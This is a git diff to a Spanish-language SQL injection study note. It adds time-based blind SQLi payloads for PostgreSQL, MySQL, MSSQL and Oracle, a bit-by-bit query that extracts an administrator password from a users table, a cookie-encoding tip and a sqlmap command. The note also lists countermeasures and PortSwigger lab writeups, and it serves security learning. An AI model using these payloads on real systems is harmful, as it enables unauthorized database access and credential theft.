@@ -51,6 +51,39 @@ admin' #
 ' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT version()), 0x7e, FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
 ```
 
+```sql
+-- Time-based SQLi: para cuando no hay error visible ni diferencia booleana.
+-- Antes de probar, registrar baseline (3-4 requests limpias) para distinguir el retardo de la latencia normal.
+
+-- Time-based - PostgreSQL (stacked queries, solo provoca retardo)
+'; SELECT pg_sleep(10)--
+
+-- Time-based - PostgreSQL/Oracle/SQLite (concatenacion, util con limite de longitud)
+'||pg_sleep(10)--
+
+-- Time-based - PostgreSQL/MySQL (clausula AND, mas universal, funciona sin stacked)
+' AND pg_sleep(10)--                          -- PostgreSQL
+' AND IF(1=1, SLEEP(10), 0)--                 -- MySQL/MariaDB
+
+-- Time-based - MS SQL Server (WAITFOR es sentencia, no funcion - requiere stacked o IF)
+'; WAITFOR DELAY '0:0:10'--
+
+-- Time-based - Oracle (no hay SLEEP puro, se usa pipe que timeoutea)
+' AND 1=(dbms_pipe.receive_message(('a'),10))--
+
+-- Time-based con inferencia bit a bit (PostgreSQL): retardo solo si el caracter coincide
+'; SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--
+
+-- Gotcha: si el sink es header Cookie, ';' es delimitador y rompe el payload.
+-- Hay que URL-encodearlo como %3B en el valor de la cookie:
+-- Cookie: TrackingId=x'%3BSELECT+pg_sleep(10)--
+```
+
+```bash
+# Time-based con sqlmap (forzar tecnica time-blind y ajustar el delay base)
+sqlmap -u "http://target.com/products?id=1" --technique=T --time-sec=5 --batch
+```
+
 ## Contramedidas
 - Uso de consultas preparadas (Prepared Statements) con parametrización.
 - Implementación de una lista blanca (Allow-list) para la validación de entradas.
@@ -61,3 +94,4 @@ admin' #
 - Kim, P. (2018). *The Hacker Playbook 3*. Secure Planet, LLC.
 - MITRE Corporation. (2024). ATT&CK Technique T1190: Exploit Public-Facing Application. https://attack.mitre.org/techniques/T1190/
 - Writeup propio: [`learning/portswigger/visible-error-based-sql-injection/writeup.md`](../../../learning/portswigger/visible-error-based-sql-injection/writeup.md) — ejemplo end-to-end del CAST PostgreSQL.
+- Writeup propio: [`learning/portswigger/blind-sqli-time-delays/writeup.md`](../../../learning/portswigger/blind-sqli-time-delays/writeup.md) — ejemplo end-to-end de time-based con `pg_sleep` (stacked queries en cookie, `;` URL-encoded como `%3B`).
